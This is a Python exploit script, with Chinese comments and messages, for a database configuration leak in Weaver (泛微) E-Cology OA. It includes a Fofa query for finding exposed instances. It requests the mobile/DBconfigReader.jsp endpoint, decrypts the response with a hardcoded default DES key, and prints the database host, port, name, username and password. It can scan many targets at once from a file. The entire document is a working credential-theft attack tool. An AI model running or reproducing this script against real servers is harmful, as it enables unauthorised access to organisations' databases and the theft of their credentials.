# -*- coding: utf-8 -*-
# 泛微OA E-Cology 数据库配置信息泄漏
# Fofa:  app="泛微-协同办公OA"

import pyDes
import requests
import argparse
import sys
import time
import multiprocessing
from rich.console import Console
from bs4 import BeautifulSoup 

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25'
}


def desdecode(secret_key, s):
    cipherX = pyDes.des('        ')
    cipherX.setKey(secret_key)
    y = cipherX.decrypt(s)
    return y


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    target_url += 'mobile/DBconfigReader.jsp'
    console.print(now_time() + " [INFO]     正在检测E_Cology_Database_Leak漏洞", style='bold blue')
    try:
        requests.packages.urllib3.disable_warnings()
        res = requests.get(url=target_url, headers=headers, timeout=10, verify=False)
        if res.status_code != 200:
            console.print(now_time() + " [WARNING]  不存在泛微OA E-Cology 数据库配置信息泄漏漏洞",style='bold red')
        elif res.status_code == 200:
            console.print(now_time() + " [INFO]     可能存在泛微OA E-Cology 数据库配置信息泄漏漏洞", style='bold blue')
            res = res.content
            try:
                data = desdecode('1z2x3c4v5b6n', res.strip())
                data = data.strip()
                dbType = str(data).split(';')[0].split(':')[1]
                dbUrl = str(data).split(';')[0].split(':')[2].split('//')[1]
                dbPort = str(data).split(';')[0].split(':')[3]
                dbName = str(data).split(';')[1].split(',')[0].split('=')[1]
                dbUser = str(data).split(';')[1].split(',')[1].split('=')[1]
                dbPass = str(data).split(';')[1].split(',')[2].split('=')[1]
                console.print(now_time() + url +
                      "\n    DBType: {0}\n    DBUrl: {1}\n    DBPort: {2}\n    DBName: {3}\n    DBUser: {4}\n    DBPass: {5}".format(
                          dbType, dbUrl, dbPort, dbName, dbUser, dbPass))
                return 'ok'
            except:
                console.print(now_time() + " [WARNING]     DES解密失败, 可能默认密钥错误, 手动访问进行确认: {}".format(url), style='bold red')
    except:
        console.print(now_time() + " [ERROR]    目标请求失败 ", style='bold red')


if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.print('\nCTRL+C 退出', style='reverse bold red')
        
